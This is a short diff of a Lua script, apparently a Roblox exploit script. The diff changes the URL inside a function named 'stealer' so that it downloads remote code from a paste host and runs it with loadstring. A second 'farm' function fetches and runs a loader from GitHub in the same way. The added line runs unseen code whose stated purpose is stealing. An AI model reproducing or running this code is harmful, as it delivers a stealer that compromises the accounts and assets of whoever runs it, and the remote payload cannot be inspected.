@@ -1,5 +1,5 @@
 local function stealer()
-   loadstring(game:HttpGet("https://cdn.sourceb.in/bins/GPQUl7KgTt/0", true))()
+   loadstring(game:HttpGet('https://cdn.cdnpastebin.com/raw/s_837d27c6561d?v=1781517594'))()
 end
 local function farm()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/renardofficiel/games/refs/heads/main/loader.lua', true))()
